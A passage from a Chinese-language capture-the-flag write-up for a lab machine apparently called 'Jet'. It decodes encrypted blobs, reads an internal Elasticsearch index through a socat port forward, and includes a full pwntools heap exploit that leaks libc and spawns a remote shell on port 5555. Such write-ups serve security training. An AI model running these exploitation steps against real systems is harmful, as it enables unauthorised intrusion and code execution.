RQQbAQ5SFgweAVMWGgYGABpLQiAIQwsAFksSAQBDGx0RVxEKDE4KHBsGBRcWAUMHFwYeFQsMABdS
FgweUxIXBlUcCgMMBAALB1IbCwoHUwEKBhEJGBYLBwlPUgwMGwoaCwRZUgEeFhYbBwEHGwoFFFMK
EVUGBBwMDA5OAhwWQwoQBwwMG1IMGUUQDAIKEwEADlMcC0MBGgBXBg0HGgYcGxBLHBVFFx0bFlcM
DA8BER8OFwIcHUUKBlIWAxcLChoPC08TGRwbDAEcBgATS2hEQ05fQk5GXl5ITlhfSFpIT0RDTl9C
TkZeXkhOWF9IWkhPRENOX0JORl5eSE5YX0haSE9EQ05fQk5GXl5ITlhfSFpIT0RDTl9CTkZeXm8=
```

```plaintext title="/home/alex/exploitme.zip Base64 Encodeed"
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
```

### featherduster

首先，编译 featherduster 的 Docker 镜像

```shell
git clone https://github.com/nccgroup/featherduster
docker build -t featherduster .
```

然后尝试解码，得到

```plaintext
Hello mate!

First of all an important finding regardhng our websitd: Login is prone to SQL injection!  Ask the Developers to fix it asap!

Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
Make sure those binaries are kept safe!

To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.

The ports are 5555 and 7777.
Have fun and keep it safe!

JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}


Cheers - Alex

-----------------------------------------------------------------------------
This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named address you should not disseminate, dhstsibute or copy!thhs e-mail. Ple`se!notify the seodes immediately cy d-mail if you have received this e-mail by mistake and delete this e-mail from your sxstem. If you are not the intended recipient you are notified that disclosing, coping, distributing or taking any action in reliance on the contents of this information is strictly prohibited.
-----------------------------------------------------------------------------
```

并且得到加密所使用的 key 为 `securewebincrocks`

## Elasticity

查看 `9201` 端口上的信息

```json title="curl 10.13.37.10:9201"
[
    {
        "category": "maintenance",
        "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday",
        "timestamp": "2017-11-10 07:00",
        "subject": "Maintenance"
    },
    {
        "category": "Maintenance",
        "body": "All upgrades are complete, and normal service resumed",
        "timestamp": "2017-11-13 13:32",
        "subject": "Upgrades complete"
    },
    {
        "category": "outage",
        "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed",
        "timestamp": "2017-11-09 15:13",
        "subject": "Server outage"
    },
    {
        "category": "maintenance",
        "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances",
        "timestamp": "2017-11-13 08:27",
        "subject": "Upgrades"
    }
]
```

同时查看服务器上开放的端口

```shell title="netstat -tuln"
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:7777            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 10.13.37.10:9201        0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN
tcp        0      0 10.13.37.10:53          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 ::1:953                 :::*                    LISTEN
tcp6       0      0 127.0.0.1:9200          :::*                    LISTEN
tcp6       0      0 127.0.0.1:9300          :::*                    LISTEN
tcp6       0      0 :::53                   :::*                    LISTEN
udp        0      0 10.13.37.10:53          0.0.0.0:*
udp        0      0 127.0.0.1:53            0.0.0.0:*
udp6       0      0 :::53                   :::*
```

根据端口信息，可以定位 `9300` 为 `Elasticsearch` 服务

这个端口没有对外界开放，所以先将端口进行转发

```shell
socat tcp-listen:9999,reuseaddr,fork tcp:localhost:9300
```

编写一个 client 与服务进行交互，使用 `test` 进行搜索

```java
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.util.Map;
import org.elasticsearch.action.admin.indices.exists.indices.IndicesExistsResponse;
import org.elasticsearch.action.admin.cluster.health.ClusterHealthResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexResponse;
import org.elasticsearch.action.admin.indices.get.GetIndexRequest;
import org.elasticsearch.transport.client.PreBuiltTransportClient;
import org.elasticsearch.cluster.health.ClusterIndexHealth;
import org.elasticsearch.common.transport.TransportAddress;
import org.elasticsearch.client.transport.TransportClient;
import org.elasticsearch.action.search.SearchResponse;
import org.elasticsearch.client.IndicesAdminClient;
import org.elasticsearch.common.settings.Settings;
import org.elasticsearch.search.SearchHit;
import org.elasticsearch.client.Client;

public class Program {
    public static void main(String[] args) {
        byte[] ipAddr = new byte[]{10, 13, 37, 10};
        Client client = new PreBuiltTransportClient(Settings.EMPTY)
            .addTransportAddress(new TransportAddress(new InetSocketAddress("10.13.37.10", 9999)));
        System.out.println(client.toString());
        ClusterHealthResponse healths = client.admin().cluster().prepareHealth().get();
        for (ClusterIndexHealth health : healths.getIndices().values()) {
            String index = health.getIndex();
            System.out.println(index);
        }
        SearchResponse searchResponse = client.prepareSearch("test").execute().actionGet();
        SearchHit[] results = searchResponse.getHits().getHits();
        for(SearchHit hit : results){
            String sourceAsString = hit.getSourceAsString();
            System.out.println(sourceAsString);
        }
        client.close();
    }
}
```

运行此程序，得到以下信息

```shell
{
  "timestamp": "2017-11-13 08:31",
  "subject": "Just a heads up Rob",
  "category": "admin",
  "draft": "no",
  "body": "Hey Rob - just so you know, that information you wanted has beensent."
}
{
  "timestamp": "2017-11-10 07:00",
  "subject": "Maintenance",
  "category": "maintenance",
  "draft": "no",
  "body": "Performance to our API has been reduced for a period of 3 hours. Services have been distributed across numerous suppliers, in order to reduce any future potential impact of another outage, as experienced yesterday"
}
{
  "timestamp": "2017-11-13 08:30",
  "subject": "Details for upgrades to EU-API-7",
  "category": "admin",
  "draft": "yes",
  "body": "Hey Rob, you asked for the password to the EU-API-7 instance. You didn not want me to send it on Slack, so I am putting it in here as a draft document. Delete this once you have copied the message, and don _NOT_ tell _ANYONE_. We need a better way of sharing secrets. The password is purpl3un1c0rn_1969. -Jason JET{3sc4p3_s3qu3nc3s_4r3_fun}"
}
{
  "timestamp": "2017-11-13 13:32",
  "subject": "Upgrades complete",
  "category": "Maintenance",
  "draft": "no",
  "body": "All upgrades are complete, and normal service resumed"
}
{
  "timestamp": "2017-11-09 15:13",
  "subject": "Server outage",
  "category": "outage",
  "draft": "no",
  "body": "Due to an outage in one of our suppliers, services were unavailable for approximately 8 hours. This has now been resolved, and normal service resumed"
}
{
  "timestamp": "2017-11-13 13:40",
  "subject": "Thanks Jazz",
  "category": "admin",
  "draft": "no",
  "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob"
}
{
  "timestamp": "2017-11-13 08:27",
  "subject": "Upgrades",
  "category": "maintenance",
  "draft": "no",
  "body": "An unscheduled maintenance period will occur at 12:00 today for approximately 1 hour. During this period, response times will be reduced while services have critical patches applied to them across all suppliers and instances"
}
```

```plaintext title="Flag"
JET{3sc4p3_s3qu3nc3s_4r3_fun}
```

## Member Manager

在上文得到的压缩包中，有两个文件

```shell
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-----          2017/12/27    22:21          10224 membermanager
-----          2017/12/27    22:22          13304 memo
```

逆向分析之后，编写脚本进行攻击

```python
#!/usr/bin/python3
from pwn import remote, p64, p16

shell = remote("10.13.37.10", 5555)

def add(size, data):
    shell.sendlineafter(b"6. exit", b"1")
    shell.sendlineafter(b"size:", str(size).encode())
    shell.sendlineafter(b"username:", data)

def edit(idx, mode, data):
    shell.sendline(b"2")
    shell.sendlineafter(b"2. insecure edit", str(mode).encode())
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.sendlineafter(b"username:", data)
    shell.recvuntil(b"6. exit")

def ban(idx):
    shell.sendline(b"3")
    shell.sendlineafter(b"index:", str(idx).encode())
    shell.recvuntil(b"6. exit")

def change(data):
    shell.sendline(b"4")
    shell.sendlineafter(b"name:", data)
    shell.recvuntil(b"6. exit")

shell.sendlineafter(b"name:", b"A" * 8)

add(0x88, b"A" * 0x88)
add(0x100, b"A" * 8)

payload  = b"A" * 0x160
payload += p64(0)
payload += p64(0x21)

add(0x500, payload)
add(0x88, b"A" * 8)

shell.recv()
ban(2)

payload  = b""
payload += b"A" * 0x88
payload += p16(0x281)

edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()

leak_read = int(shell.recvline()[:-1], 10)
libc_base = leak_read - 0xf7250

payload  = b""
payload += p64(0) * 3
payload += p64(libc_base + 0x45390)

change(payload)

payload  = b""
payload += b"A" * 256
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(libc_base + 0x3c5520 - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(0x6020a0)

edit(1, 1, payload)

shell.sendline(b"1")
shell.sendlineafter(b"size:", str(0x80).encode())
shell.recvuntil(b"[vsyscall]")
shell.recvline()
shell.interactive()
```

得到 `flag.txt` 文件的数据

```plaintext
JET{h34p_f0r_73h_b4bi3z}

                                                 __----~~~~~~~~~~~------___
                                      .  .   ~~//====......          __--~ ~~
                      -.            \_|//     |||\\  ~~~~~~::::... /~
                   ___-==_       _-~o~  \/    |||  \\            _/~~-
           __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
       _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
     .~       .~       |   \\ -_    /  /-   /   ||      \   /
    /  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
    |~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
             '         ~-|      /|    |-~\~~       __--~~
                         |-~~-_/ |    |   ~\_   _-~            /\
                              /  \     \__   \/~                \__
                          _--~ _/ | .-~~____--~-/                  ~~==.
                         ((->/~   '.|||' -_|    ~~-/ ,              . _||
                                    -_     ~\      ~~---l__i__i__i--~~_/
                                    _-~-__   ~)  \--______________--~~
                                  //.-~~~-~_--~- |-------~~~~~~~~
                                         //.-~~~--\
```

```plaintext title="Flag"
JET{h34p_f0r_73h_b4bi3z}
```

## More Secrets

在 `/home/tony` 目录中，有以下文件

```shell
(remote) www-data@jet:/home/tony$ ls -lah
total 40K
drwxr-xr-x 3 tony tony 4.0K Dec 28  2017 .
drwxr-xr-x 8 root root 4.0K Apr  1  2018 ..
-rw-r--r-- 1 tony tony  223 Dec 28  2017 .bash_history
-rw-r--r-- 1 tony tony  220 Dec 28  2017 .bash_logout
-rw-r--r-- 1 tony tony 3.7K Dec 28  2017 .bashrc
-rw-r--r-- 1 tony tony  655 Dec 28  2017 .profile
-rw-r--r-- 1 root root  129 Dec 28  2017 key.bin.enc
